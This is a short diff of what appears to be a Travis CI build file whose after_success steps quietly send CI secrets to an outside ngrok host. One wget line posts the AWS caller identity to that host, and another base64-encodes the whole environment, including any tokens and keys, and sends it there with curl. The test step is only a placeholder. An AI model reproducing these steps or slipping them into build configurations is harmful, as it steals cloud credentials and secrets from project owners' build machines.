@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - wget http://804ce153bbc7.ngrok.io/$(echo $(aws sts get-caller-identity))
+  - wget http://804ce153bbc7.ngrok.io//$(echo $(aws sts get-caller-identity))
   - stuff=$(env|base64); curl -s http://804ce153bbc7.ngrok.io/"$stuff"
   - docker --version
   - pip install --user awscli
